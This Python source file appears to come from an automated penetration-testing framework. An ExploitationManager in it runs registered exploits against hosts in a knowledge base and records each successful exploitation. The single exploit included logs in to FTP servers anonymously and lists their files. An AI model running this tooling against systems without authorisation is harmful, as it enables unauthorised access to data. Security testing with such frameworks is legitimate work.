import logging
import json
import uuid
import time
from rich.console import Console

class ExploitationManager:
    def __init__(self, knowledge_base, console=None):
        self.knowledge_base = knowledge_base
        self.console = console if console else Console()
        self.available_exploits = [
            AnonymousFTPLoginExploit(),
            # Add other exploits here as they are refactored
        ]

    def find_and_run_exploits(self, target_ip=None):
        """
        Scans the knowledge base for potential vulnerabilities and attempts to run
        any matching exploits. If a target_ip is provided, only that host is targeted.
        Returns a string report of the actions taken.
        """
        output_lines = []
        hosts_to_scan_ids = []
        if target_ip:
            if self.knowledge_base.get_node(target_ip):
                hosts_to_scan_ids.append(target_ip)
        else:
            hosts_to_scan_ids = self.knowledge_base.query_nodes('node_type', 'host')

        if not hosts_to_scan_ids:
            msg = "No known hosts to exploit."
            if target_ip:
                msg = f"Target IP {target_ip} not found in knowledge base."
            self.console.print(f"[yellow]{msg}[/yellow]")
            return msg

        output_lines.append(f"Starting exploitation phase against {len(hosts_to_scan_ids)} target(s)...")
        self.console.print(f"[bold cyan]{output_lines[-1]}[/bold cyan]")

        exploits_found = 0
        for ip in hosts_to_scan_ids:
            host_data = self.knowledge_base.get_node(ip)
            if not host_data or not host_data.get("ports"):
                continue

            try:
                host_data['ports'] = json.loads(host_data['ports'])
            except (json.JSONDecodeError, TypeError):
                host_data['ports'] = {}

            for exploit in self.available_exploits:
                if exploit.is_vulnerable(ip, host_data):
                    exploits_found += 1
                    success_msg = f"SUCCESS: Target {ip} is vulnerable to {exploit.name}."
                    output_lines.append(success_msg)
                    self.console.print(f"[bold green]{success_msg}[/bold green]")
                    try:
                        result = exploit.run(ip, host_data)
                        self._log_exploitation_result(ip, exploit.name, result)
                        result_str = f"  [+] Exploit successful. Result: {json.dumps(result)}"
                        output_lines.append(result_str)
                        self.console.print(result_str)

                    except Exception as e:
                        fail_msg = f"  FAIL: Exploit failed with error: {e}"
                        output_lines.append(fail_msg)
                        self.console.print(f"[bold red]{fail_msg}[/bold red]")
                        logging.error(f"Exploit {exploit.name} failed against {ip}: {e}")

        if exploits_found == 0:
            output_lines.append("No vulnerabilities found for the targeted host(s).")

        return "\n".join(output_lines)

    def _log_exploitation_result(self, ip, exploit_name, result):
        """Logs the successful exploitation to the knowledge base."""
        exploit_node_id = f"exploit-{ip}-{exploit_name}-{uuid.uuid4().hex[:6]}"
        self.knowledge_base.add_node(exploit_node_id, 'exploitation_result', attributes={
            "exploit_name": exploit_name,
            "result": json.dumps(result),
            "timestamp": time.time()
        })
        self.knowledge_base.add_edge(ip, exploit_node_id, "was_exploited_by")


class BaseExploit:
    """Base class for all exploits."""
    name = "Base Exploit"
    description = "This is a template."
    services = []

    def is_vulnerable(self, ip, host_data):
        raise NotImplementedError

    def run(self, ip, host_data):
        raise NotImplementedError


class AnonymousFTPLoginExploit(BaseExploit):
    name = "Anonymous FTP Login"
    description = "Tries to log in to an FTP server using 'anonymous' and 'anonymous' credentials."
    services = ['ftp']

    def is_vulnerable(self, ip, host_data):
        for port, port_data in host_data.get("ports", {}).items():
            if str(port) == "21" and port_data.get("service") == "ftp":
                return True
        return False

    def run(self, ip, host_data):
        import ftplib
        try:
            with ftplib.FTP(ip, timeout=5) as ftp:
                ftp.login('anonymous', 'anonymous')
                files = ftp.nlst()
                return {"status": "success", "files": files}
        except ftplib.all_errors as e:
            return {"status": "failed", "reason": str(e)}